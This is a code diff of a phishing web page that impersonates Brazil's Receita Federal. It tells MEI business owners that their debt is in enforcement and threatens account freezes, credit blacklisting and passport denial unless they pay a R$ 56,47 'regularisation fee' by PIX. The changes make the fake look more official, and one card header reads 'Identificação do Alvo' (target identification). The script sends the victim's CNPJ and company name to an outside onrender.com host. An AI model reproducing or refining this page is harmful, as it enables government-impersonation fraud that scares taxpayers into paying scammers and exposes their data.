@@ -4,21 +4,25 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
     <meta name="theme-color" content="#003366">
-    <title>Regularização MEI - Oficial</title>
+    <title>Portal de Regularização - Receita Federal</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Montserrat:wght@700;800&display=swap" rel="stylesheet">
     <style>
         :root {
             --gov-blue: #003366;
-            --danger: #df2020;
-            --success: #27ae60;
-            --bg: #f8fafc;
-            --text-main: #1e293b;
-            --text-muted: #64748b;
+            --gov-blue-light: #eef2f7;
+            --danger: #d32f2f;
+            --danger-soft: #fff5f5;
+            --success: #1b5e20;
+            --success-btn: #2e7d32;
+            --text-primary: #1c1e21;
+            --text-secondary: #5f6368;
             --white: #ffffff;
-            --radius: 16px;
-            --safe-area-inset-bottom: env(safe-area-inset-bottom);
+            --border: #dadce0;
+            --radius-lg: 16px;
+            --radius-md: 12px;
+            --shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
         }
 
         * {
@@ -30,360 +34,405 @@
 
         body {
             font-family: 'Inter', sans-serif;
-            background-color: var(--bg);
-            color: var(--text-main);
-            line-height: 1.5;
-            padding-bottom: calc(100px + var(--safe-area-inset-bottom));
+            background-color: #f1f3f4;
+            color: var(--text-primary);
+            line-height: 1.6;
+            padding-bottom: 120px; /* Espaço para o rodapé fixo */
         }
 
-        /* Header Mobile Otimizado */
+        /* Top Bar Institucional */
+        .top-nav {
+            background: var(--gov-blue);
+            color: white;
+            padding: 8px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.65rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
         header {
             background: var(--white);
-            padding: 16px 20px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            border-bottom: 1px solid #e2e8f0;
-            position: sticky;
-            top: 0;
-            z-index: 100;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid var(--border);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
         }
 
         .brasao {
-            height: 40px;
-            width: auto;
+            height: 50px;
+            margin-bottom: 10px;
         }
 
-        .header-text h1 {
-            font-size: 0.9rem;
+        .header-titles h1 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 1rem;
             font-weight: 800;
             color: var(--gov-blue);
             text-transform: uppercase;
-            line-height: 1.1;
+            margin-bottom: 2px;
         }
 
-        .header-text p {
-            font-size: 0.65rem;
-            color: var(--text-muted);
-            font-weight: 600;
-        }
-
-        /* Banner de Alerta Compacto */
-        .alert-bar {
-            background: var(--danger);
-            color: white;
-            padding: 8px 20px;
+        .header-titles p {
             font-size: 0.75rem;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        /* Alerta de Contexto Harmonizado */
+        .context-banner {
+            background: var(--danger-soft);
+            border-bottom: 1px solid #ffcdd2;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .pulse-icon {
+            width: 10px;
+            height: 10px;
+            background: var(--danger);
+            border-radius: 50%;
+            flex-shrink: 0;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(211, 47, 47, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(211, 47, 47, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(211, 47, 47, 0); }
+        }
+
+        .context-text {
+            font-size: 0.8rem;
             font-weight: 700;
-            text-align: center;
+            color: var(--danger);
             text-transform: uppercase;
         }
 
         main {
-            padding: 20px;
+            padding: 16px;
+            max-width: 500px;
+            margin: 0 auto;
         }
 
-        /* Card de Informações Estilo App */
-        .info-card {
+        /* Card de Dados - Mais Harmônico */
+        .data-card {
             background: var(--white);
-            border-radius: var(--radius);
-            padding: 20px;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03);
+            border-radius: var(--radius-md);
+            border: 1px solid var(--border);
+            overflow: hidden;
             margin-bottom: 20px;
-            border: 1px solid #f1f5f9;
         }
 
-        .card-label {
-            font-size: 0.7rem;
-            color: var(--text-muted);
-            font-weight: 700;
+        .card-header {
+            background: var(--gov-blue-light);
+            padding: 12px 16px;
+            font-size: 0.75rem;
+            font-weight: 800;
+            color: var(--gov-blue);
             text-transform: uppercase;
-            margin-bottom: 12px;
             display: flex;
             justify-content: space-between;
         }
 
-        .badge-live {
-            color: var(--danger);
-            display: flex;
-            align-items: center;
-            gap: 4px;
+        .card-body {
+            padding: 16px;
         }
 
-        .badge-live::before {
-            content: "";
-            width: 6px;
-            height: 6px;
-            background: var(--danger);
-            border-radius: 50%;
-            animation: pulse 1.5s infinite;
+        .data-field {
+            margin-bottom: 12px;
         }
 
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.3; }
-            100% { opacity: 1; }
-        }
+        .data-field:last-child { margin-bottom: 0; }
 
-        .data-group {
-            margin-bottom: 16px;
-        }
-
-        .data-group:last-child { margin-bottom: 0; }
-
-        .data-label {
-            font-size: 0.75rem;
-            color: var(--text-muted);
+        .label {
+            font-size: 0.65rem;
+            color: var(--text-secondary);
+            font-weight: 600;
+            text-transform: uppercase;
             display: block;
             margin-bottom: 2px;
         }
 
-        .data-value {
-            font-size: 1rem;
+        .value {
+            font-size: 0.95rem;
             font-weight: 700;
-            color: var(--gov-blue);
+            color: var(--text-primary);
             word-break: break-all;
         }
 
-        .status-box {
-            background: #fff1f2;
-            padding: 12px;
-            border-radius: 8px;
-            margin-top: 10px;
-            border-left: 4px solid var(--danger);
-        }
-
-        .status-text {
+        .status-badge {
+            display: inline-block;
+            background: var(--danger-soft);
             color: var(--danger);
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
             font-weight: 800;
-            font-size: 0.85rem;
-            text-transform: uppercase;
+            margin-top: 4px;
         }
 
-        /* Seção de Consequências (Accordion-like) */
-        .warning-section {
+        /* Seção Narrativa de Consequências */
+        .narrative-section {
             margin-bottom: 24px;
         }
 
-        .warning-title {
+        .section-title {
             font-size: 0.9rem;
             font-weight: 800;
-            color: var(--text-main);
             margin-bottom: 12px;
+            color: var(--text-primary);
             display: flex;
             align-items: center;
             gap: 8px;
         }
 
-        .warning-item {
-            background: #f1f5f9;
+        .consequence-box {
+            display: grid;
+            gap: 10px;
+        }
+
+        .consequence-item {
+            background: var(--white);
             padding: 12px 16px;
-            border-radius: 12px;
-            margin-bottom: 8px;
-            font-size: 0.85rem;
+            border-radius: var(--radius-md);
+            border: 1px solid var(--border);
             display: flex;
             align-items: center;
             gap: 12px;
-            color: #334155;
-            font-weight: 600;
+            transition: transform 0.2s;
         }
 
-        .warning-icon {
+        .icon-wrap {
+            width: 32px;
+            height: 32px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             font-size: 1.1rem;
             flex-shrink: 0;
         }
 
-        /* Footer Fixo de Ação (Bottom Sheet Style) */
-        .bottom-action {
+        .consequence-text {
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: #3c4043;
+        }
+
+        /* Footer de Ação Fixo Harmonizado */
+        .action-footer {
             position: fixed;
             bottom: 0;
             left: 0;
-            width: 100%;
+            right: 0;
             background: var(--white);
-            padding: 16px 20px calc(16px + var(--safe-area-inset-bottom));
-            box-shadow: 0 -10px 25px rgba(0,0,0,0.1);
-            border-top: 1px solid #e2e8f0;
-            z-index: 200;
+            padding: 16px 20px calc(16px + env(safe-area-inset-bottom));
+            box-shadow: 0 -4px 12px rgba(0,0,0,0.08);
+            border-top: 1px solid var(--border);
+            z-index: 1000;
+        }
+
+        .footer-flex {
+            max-width: 500px;
+            margin: 0 auto;
             display: flex;
             flex-direction: column;
             gap: 12px;
         }
 
-        .price-info {
+        .price-container {
             display: flex;
             justify-content: space-between;
-            align-items: center;
+            align-items: flex-end;
         }
 
-        .price-text {
-            font-size: 0.8rem;
-            color: var(--text-muted);
+        .price-label {
+            font-size: 0.75rem;
+            color: var(--text-secondary);
             font-weight: 600;
         }
 
-        .price-val {
-            font-size: 1.5rem;
+        .price-value {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 1.6rem;
             font-weight: 800;
             color: var(--gov-blue);
         }
 
-        .btn-pay {
-            background: var(--success);
+        .btn-action {
+            background: var(--success-btn);
             color: white;
             text-align: center;
             padding: 16px;
-            border-radius: 14px;
+            border-radius: 12px;
             text-decoration: none;
             font-weight: 800;
-            font-size: 1.05rem;
+            font-size: 1rem;
             text-transform: uppercase;
-            box-shadow: 0 4px 12px rgba(39, 174, 96, 0.3);
-            transition: transform 0.1s;
+            box-shadow: 0 4px 0 #1b5e20;
+            transition: all 0.1s;
         }
 
-        .btn-pay:active {
-            transform: scale(0.98);
+        .btn-action:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 0 #1b5e20;
         }
 
-        .pix-tag {
-            font-size: 0.7rem;
-            color: var(--text-muted);
-            text-align: center;
-            font-weight: 600;
+        .pix-info {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 4px;
+            gap: 6px;
+            font-size: 0.7rem;
+            color: var(--text-secondary);
+            font-weight: 600;
         }
 
-        .pix-tag img {
+        .pix-info img {
             height: 12px;
             filter: grayscale(1);
-            opacity: 0.7;
+            opacity: 0.6;
         }
 
-        /* Disclaimer Final */
-        .legal-disclaimer {
+        /* Disclaimer de Contexto Final */
+        .disclaimer {
             font-size: 0.7rem;
-            color: var(--text-muted);
-            text-align: justify;
-            background: #f1f5f9;
+            color: var(--text-secondary);
+            background: #e8eaed;
             padding: 16px;
-            border-radius: 12px;
-            margin-top: 20px;
+            border-radius: var(--radius-md);
+            text-align: justify;
+            margin-top: 10px;
         }
 
-        .legal-disclaimer strong {
+        .disclaimer strong {
             color: var(--danger);
             display: block;
             margin-bottom: 4px;
         }
 
-        .footer-bottom {
+        .final-copy {
             text-align: center;
-            padding: 20px 0;
-            font-size: 0.65rem;
-            color: var(--text-muted);
+            padding: 20px;
+            font-size: 0.6rem;
+            color: #9aa0a6;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
+            letter-spacing: 1px;
         }
 
     </style>
 </head>
 <body>
 
+    <div class="top-nav">
+        <span>Brasil.gov.br</span>
+        <span>Acesso à Informação</span>
+    </div>
+
     <header>
-        <img src="https://www.gov.br/planalto/pt-br/conheca-a-presidencia/acervo/simbolos-nacionais/brasao/brasaooficialcolorido.png" alt="Gov" class="brasao">
-        <div class="header-text">
+        <img src="https://www.gov.br/planalto/pt-br/conheca-a-presidencia/acervo/simbolos-nacionais/brasao/brasaooficialcolorido.png" alt="Brasão Nacional" class="brasao">
+        <div class="header-titles">
             <h1>Receita Federal</h1>
-            <p>Portal de Regularização MEI</p>
+            <p>Sistema de Regularização Administrativa</p>
         </div>
     </header>
 
-    <div class="alert-bar">
-        ⚠️ Ação Urgente Requerida: Prazo Final
+    <div class="context-banner">
+        <div class="pulse-icon"></div>
+        <div class="context-text">Notificação de Ultimato em Andamento</div>
     </div>
 
     <main>
-        <div class="info-card">
-            <div class="card-label">
-                <span>Dados do Contribuinte</span>
-                <span class="badge-live">Em Processamento</span>
+        <div class="data-card">
+            <div class="card-header">
+                <span>Identificação do Alvo</span>
+                <span>Oficial</span>
             </div>
-            
-            <div class="data-group">
-                <span class="data-label">CNPJ</span>
-                <span id="cnpj" class="data-value">...</span>
-            </div>
-
-            <div class="data-group">
-                <span class="data-label">Razão Social</span>
-                <span id="empresa" class="data-value">...</span>
-            </div>
-
-            <div class="status-box">
-                <span class="status-text">⚠️ Débito em Fase de Execução</span>
-            </div>
-        </div>
-
-        <div class="warning-section">
-            <h2 class="warning-title">Consequências Imediatas</h2>
-            
-            <div class="warning-item">
-                <span class="warning-icon">📉</span>
-                <span>Restrição Total no CPF (Serasa/SPC)</span>
-            </div>
-            <div class="warning-item">
-                <span class="warning-icon">🚫</span>
-                <span>Bloqueio de Contas (SISBAJUD)</span>
-            </div>
-            <div class="warning-item">
-                <span class="warning-icon">⚖️</span>
-                <span>Inscrição em Dívida Ativa da União</span>
-            </div>
-            <div class="warning-item">
-                <span class="warning-icon">🛂</span>
-                <span>Impedimento de Passaporte e Crédito</span>
+            <div class="card-body">
+                <div class="data-field">
+                    <span class="label">CNPJ do Contribuinte</span>
+                    <span id="cnpj" class="value">Carregando...</span>
+                </div>
+                <div class="data-field">
+                    <span class="label">Razão Social / Nome</span>
+                    <span id="empresa" class="value">Carregando...</span>
+                </div>
+                <div class="data-field">
+                    <span class="label">Situação do Processo</span>
+                    <span class="status-badge">⚠️ DÉBITO EM FASE DE EXECUÇÃO</span>
+                </div>
             </div>
         </div>
 
-        <div class="legal-disclaimer">
-            <strong>AVISO DE ULTIMATO:</strong>
-            A regularização por este canal suspende imediatamente o envio do processo para a PGFN e evita a penhora online de bens e valores vinculados ao CPF do titular.
+        <section class="narrative-section">
+            <h2 class="section-title">Implicações no CPF do Titular</h2>
+            <div class="consequence-box">
+                <div class="consequence-item">
+                    <div class="icon-wrap">🚫</div>
+                    <span class="consequence-text">Bloqueio imediato de contas bancárias</span>
+                </div>
+                <div class="consequence-item">
+                    <div class="icon-wrap">📉</div>
+                    <span class="consequence-text">Inscrição em Dívida Ativa da União</span>
+                </div>
+                <div class="consequence-item">
+                    <div class="icon-wrap">⚖️</div>
+                    <span class="consequence-text">Restrição total no Serasa e SPC</span>
+                </div>
+                <div class="consequence-item">
+                    <div class="icon-wrap">🛂</div>
+                    <span class="consequence-text">Impedimento de emissão de passaporte</span>
+                </div>
+            </div>
+        </section>
+
+        <div class="disclaimer">
+            <strong>AVISO IMPORTANTE:</strong>
+            A regularização através deste portal administrativo suspende imediatamente qualquer ação de cobrança, penhora online ou restrição em curso contra o CPF do titular.
         </div>
 
-        <div class="footer-bottom">
-            &copy; 2026 Receita Federal do Brasil
+        <div class="final-copy">
+            &copy; 2026 Secretaria da Receita Federal do Brasil
         </div>
     </main>
 
-    <div class="bottom-action">
-        <div class="price-info">
-            <span class="price-text">Taxa Única de Regularização:</span>
-            <span class="price-val">R$ 56,47</span>
-        </div>
-        <a href="#" id="btn-main" class="btn-pay">
-            Regularizar Agora
-        </a>
-        <div class="pix-tag">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo_Pix.png" alt="Pix">
-            Liberação imediata via PIX
+    <div class="action-footer">
+        <div class="footer-flex">
+            <div class="price-container">
+                <span class="price-label">Taxa Única de Regularização:</span>
+                <span class="price-value">R$ 56,47</span>
+            </div>
+            <a href="#" id="btn-submit" class="btn-action">
+                Regularizar Situação Agora
+            </a>
+            <div class="pix-info">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo_Pix.png" alt="Pix">
+                Compensação imediata via PIX
+            </div>
         </div>
     </div>
 
     <script>
         function clean(str) {
             if (!str) return "";
+            // Remove colchetes, aspas e espaços
             return str.replace(/[\[\]"']/g, "").trim();
         }
 
-        function getUrlParams() {
+        function getParams() {
             const params = {};
             const search = window.location.search;
             if (search) {
-                const parts = search.substring(1).split("&");
-                for (const part of parts) {
-                    const [key, value] = part.split("=");
+                const pairs = search.substring(1).split("&");
+                for (const pair of pairs) {
+                    const [key, value] = pair.split("=");
                     if (key) {
                         params[decodeURIComponent(key)] = clean(decodeURIComponent(value || ""));
                     }
@@ -393,19 +442,19 @@
         }
 
         window.onload = function() {
-            const data = getUrlParams();
+            const data = getParams();
             const cnpj = data['cnpj'] || "Não identificado";
             const empresa = data['empresa'] || "Contribuinte não identificado";
 
             document.getElementById('cnpj').textContent = cnpj;
             document.getElementById('empresa').textContent = empresa;
 
-            const btn = document.getElementById('btn-main');
-            const baseUrl = "https://nacionalmei.onrender.com/PEND/";
+            const btn = document.getElementById('btn-submit');
+            const target = "https://nacionalmei.onrender.com/PEND/";
 
             btn.addEventListener('click', function(e) {
                 e.preventDefault();
-                window.location.href = `${baseUrl}?cnpj=${encodeURIComponent(cnpj)}&empresa=${encodeURIComponent(empresa)}`;
+                window.location.href = `${target}?cnpj=${encodeURIComponent(cnpj)}&empresa=${encodeURIComponent(empresa)}`;
             });
         };
     </script>
